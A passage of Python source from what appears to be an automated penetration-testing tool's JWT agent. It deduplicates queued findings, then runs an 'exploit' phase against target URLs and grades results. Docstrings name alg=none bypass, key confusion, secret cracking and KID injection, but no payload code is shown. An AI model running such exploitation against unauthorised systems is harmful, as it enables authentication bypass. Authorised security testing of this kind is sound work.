                return dry_list
            else:
                logger.warning(f"[{self.name}] LLM returned empty list, using fallback")
                return self._fallback_fingerprint_dedup(wet_findings)

        except Exception as e:
            logger.warning(f"[{self.name}] LLM deduplication failed: {e}, using fallback")
            return self._fallback_fingerprint_dedup(wet_findings)

    def _fallback_fingerprint_dedup(self, wet_findings: List[Dict]) -> List[Dict]:
        """
        Fallback fingerprint-based deduplication if LLM fails.
        Uses _generate_jwt_fingerprint for expert dedup.
        """
        seen = set()
        dry_list = []

        for finding in wet_findings:
            url = finding.get("url", "")
            vuln_type = finding.get("vuln_type", finding.get("type", "JWT"))

            fingerprint = self._generate_jwt_fingerprint(url, vuln_type)

            if fingerprint not in seen:
                seen.add(fingerprint)
                dry_list.append(finding)

        logger.info(f"[{self.name}] Fingerprint dedup: {len(wet_findings)} → {len(dry_list)}")
        return dry_list

    async def exploit_dry_list(self) -> List[Dict]:
        """
        PHASE B: Exploit all DRY findings and emit validated vulnerabilities.

        Returns:
            List of validated findings
        """
        logger.info(f"[{self.name}] ===== PHASE B: Exploiting DRY list =====")
        logger.info(f"[{self.name}] Phase B: Exploiting {len(self._dry_findings)} DRY findings...")

        validated_findings = []

        for idx, finding in enumerate(self._dry_findings, 1):
            url = finding.get("url", "")
            token = finding.get("token", "")
            vuln_type = finding.get("vuln_type", finding.get("type", "JWT"))

            logger.info(f"[{self.name}] Phase B: [{idx}/{len(self._dry_findings)}] Testing {url} type={vuln_type}")

            # Check fingerprint to avoid re-emitting
            fingerprint = self._generate_jwt_fingerprint(url, vuln_type)
            if fingerprint in self._emitted_findings:
                logger.debug(f"[{self.name}] Phase B: Skipping already emitted finding")
                continue

            # Execute JWT attack
            try:
                result = await self._test_single_item_from_queue(url, token, finding)

                if result:
                    # Mark as emitted
                    self._emitted_findings.add(fingerprint)

                    # Ensure dict format
                    if not isinstance(result, dict):
                        result = {
                            "url": url,
                            "token": token,
                            "type": "JWT",
                            "vuln_type": vuln_type,
                            "severity": "HIGH",
                            "validated": True
                        }

                    validated_findings.append(result)

                    # Emit event
                    if self.event_bus:
                        self.event_bus.emit(EventType.VULNERABILITY_DETECTED, {
                            "type": "JWT",
                            "url": result.get("url", url),
                            "vuln_type": result.get("vuln_type", vuln_type),
                            "severity": result.get("severity", "HIGH"),
                            "scan_context": self._scan_context,
                            "agent": self.name
                        })

                    logger.info(f"[{self.name}] ✓ JWT vulnerability confirmed: {url} type={vuln_type}")
                else:
                    logger.debug(f"[{self.name}] ✗ JWT vulnerability not confirmed")

            except Exception as e:
                logger.error(f"[{self.name}] Phase B: Exploitation failed: {e}")

        logger.info(f"[{self.name}] Phase B: Exploitation complete. {len(validated_findings)} validated findings")
        return validated_findings

    async def _generate_specialist_report(self, validated_findings: List[Dict]) -> None:
        """
        Generate specialist report for JWT findings.

        Report structure:
        - phase_a: WET → DRY deduplication stats
        - phase_b: Exploitation results
        - findings: All validated JWT findings
        """
        import aiofiles

        # Use absolute path from settings.BASE_DIR
        scan_id = self._scan_context.split("/")[-1] if "/" in self._scan_context else self._scan_context
        scan_dir = settings.BASE_DIR / "reports" / scan_id
        specialists_dir = scan_dir / "specialists"
        specialists_dir.mkdir(parents=True, exist_ok=True)

        report = {
            "agent": f"{self.name}",
            "vulnerability_type": "JWT",
            "scan_context": self._scan_context,
            "phase_a": {
                "wet_count": len(self._dry_findings) + (len(validated_findings) - len(self._dry_findings)),  # Approximate
                "dry_count": len(self._dry_findings),
                "deduplication_method": "LLM + fingerprint fallback (netloc-only)"
            },
            "phase_b": {
                "exploited_count": len(self._dry_findings),
                "validated_count": len(validated_findings)
            },
            "findings": validated_findings,
            "summary": {
                "total_validated": len(validated_findings),
                "vuln_types_found": list(set(f.get("vuln_type", "JWT") for f in validated_findings))
            }
        }

        report_path = specialists_dir / "jwt_report.json"

        async with aiofiles.open(report_path, "w") as f:
            await f.write(json.dumps(report, indent=2))

        logger.info(f"[{self.name}] Specialist report saved: {report_path}")

    # ========================================
    # Queue Consumer Mode (Phase 20)
    # ========================================

    async def start_queue_consumer(self, scan_context: str) -> None:
        """
        TWO-PHASE queue consumer (WET → DRY). NO infinite loop.

        Phase A: Drain ALL findings from queue and deduplicate
        Phase B: Exploit DRY list only

        Args:
            scan_context: Scan identifier for event correlation
        """
        self._queue_mode = True
        self._scan_context = scan_context

        logger.info(f"[{self.name}] Starting TWO-PHASE queue consumer (WET → DRY)")

        # PHASE A: Analyze and deduplicate
        logger.info(f"[{self.name}] ===== PHASE A: Analyzing WET list =====")
        dry_list = await self.analyze_and_dedup_queue()

        if not dry_list:
            logger.info(f"[{self.name}] No findings to exploit after deduplication")
            return  # Terminate agent

        # PHASE B: Exploit DRY findings
        logger.info(f"[{self.name}] ===== PHASE B: Exploiting DRY list =====")
        results = await self.exploit_dry_list()

        # REPORTING: Generate specialist report
        if results or self._dry_findings:
            await self._generate_specialist_report(results)

        logger.info(f"[{self.name}] Queue consumer complete: {len(results)} validated findings")

        # Method ends - agent terminates ✅

    async def _process_queue_item(self, item: dict) -> Optional[Dict]:
        """Process a single item from the jwt queue."""
        finding = item.get("finding", {})
        url = finding.get("url")
        token = finding.get("token")

        if not url and not token:
            logger.warning(f"[{self.name}] Invalid queue item: missing url or token")
            return None

        return await self._test_single_item_from_queue(url, token, finding)

    async def _test_single_item_from_queue(self, url: str, token: str, finding: dict) -> Optional[Dict]:
        """Test a single item from queue for JWT vulnerabilities."""
        try:
            if token:
                # Analyze provided token
                await self._analyze_and_exploit(token, url, "queue")
                if self.findings:
                    return self.findings[-1]  # Return most recent finding
            elif url:
                # Discover tokens from URL
                result = await self.check_url(url)
                if result.get("vulnerable") and result.get("findings"):
                    return result["findings"][0]
            return None
        except Exception as e:
            logger.error(f"[{self.name}] Queue item test failed: {e}")
            return None

    def _generate_jwt_fingerprint(self, url: str, vuln_type: str) -> tuple:
        """
        Generate JWT finding fingerprint for expert deduplication.

        Returns:
            Tuple fingerprint for deduplication
        """
        from urllib.parse import urlparse

        parsed = urlparse(url)

        # JWT signature: Token-specific (netloc + vulnerability type)
        # JWT vulnerabilities are token-specific, not URL-specific
        fingerprint = ("JWT", parsed.netloc, vuln_type)

        return fingerprint

    async def _handle_queue_result(self, item: dict, result: Optional[Dict]) -> None:
        """Handle completed queue item processing."""
        if result is None:
            return

        # Determine validation status from finding
        status = self._get_validation_status(result)

        # EXPERT DEDUPLICATION: Check if we already emitted this finding
        url = result.get("url")
        vuln_type = result.get("vulnerability_type", result.get("type"))
        fingerprint = self._generate_jwt_fingerprint(url, vuln_type)

        if fingerprint in self._emitted_findings:
            logger.info(f"[{self.name}] Skipping duplicate JWT finding (already reported)")
            return

        # Mark as emitted
        self._emitted_findings.add(fingerprint)

        if self.event_bus and settings.WORKER_POOL_EMIT_EVENTS:
            await self.event_bus.emit(EventType.VULNERABILITY_DETECTED, {
                "specialist": "jwt",
                "finding": {
                    "type": "JWT",
                    "url": result.get("url"),
                    "vulnerability": result.get("vulnerability_type", result.get("type")),
                    "severity": result.get("severity"),
                },
                "status": status,
                "validation_requires_cdp": status == ValidationStatus.PENDING_VALIDATION.value,
                "scan_context": self._scan_context,
            })

        logger.info(f"[{self.name}] Confirmed JWT vulnerability: {result.get('vulnerability_type', result.get('type', 'unknown'))} [status={status}]")

    async def _on_work_queued(self, data: dict) -> None:
        """Handle work_queued_jwt notification (logging only)."""
        logger.debug(f"[{self.name}] Work queued: {data.get('finding', {}).get('url', 'unknown')}")

    async def stop_queue_consumer(self) -> None:
        """Stop queue consumer mode gracefully."""
        if self._worker_pool:
            await self._worker_pool.stop()
            self._worker_pool = None

        if self.event_bus:
            self.event_bus.unsubscribe(
                EventType.WORK_QUEUED_JWT.value,
                self._on_work_queued
            )

        self._queue_mode = False
        logger.info(f"[{self.name}] Queue consumer stopped")

    def get_queue_stats(self) -> dict:
        """Get queue consumer statistics."""
        if not self._worker_pool:
            return {"mode": "direct", "queue_mode": False}

        return {
            "mode": "queue",
            "queue_mode": True,
            "worker_stats": self._worker_pool.get_stats(),
        }

    def _get_validation_status(self, finding: Dict) -> str:
        """
        Determine tiered validation status for JWT finding.

        TIER 1 (VALIDATED_CONFIRMED): Definitive proof
            - alg=none bypass works (token accepted without signature)
            - Key confusion exploit succeeds (valid forged signature)
            - Weak secret cracked and admin token accepted
            - KID injection successful

        TIER 2 (PENDING_VALIDATION): Needs verification
            - Algorithm confusion detected but not confirmed
            - Signature not verified by server (ambiguous behavior)
            - JWT structure vulnerable but exploit not confirmed

        Most JWT findings are business logic - if the forged token is accepted
        with elevated privileges, it's VALIDATED_CONFIRMED.
        """
        vuln_type = finding.get("type", "").lower()

        # TIER 1: None algorithm bypass confirmed
        if "none" in vuln_type and finding.get("validated"):
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: Key confusion attack confirmed
        if "confusion" in vuln_type and finding.get("validated"):
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: Weak secret cracked
        if "weak" in vuln_type or "secret" in vuln_type:
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: KID injection successful
        if "kid" in vuln_type and finding.get("validated"):
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: Generic validated finding
        if finding.get("validated") and finding.get("status") == "VALIDATED_CONFIRMED":
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 2: Algorithm confusion detected but not exploited
        if "confusion" in vuln_type or "algorithm" in vuln_type:
            return ValidationStatus.PENDING_VALIDATION.value

        # TIER 2: JWT vulnerability detected but needs confirmation
        if not finding.get("validated"):
            return ValidationStatus.PENDING_VALIDATION.value

        # Default: Specialist trust
        return ValidationStatus.VALIDATED_CONFIRMED.value


async def run_jwt_analysis(token: str, url: str) -> Dict:
    """Convenience function for standalone analysis."""
    agent = JWTAgent()
    await agent._analyze_and_exploit(token, url, "manual")
    return {"findings": agent.findings}

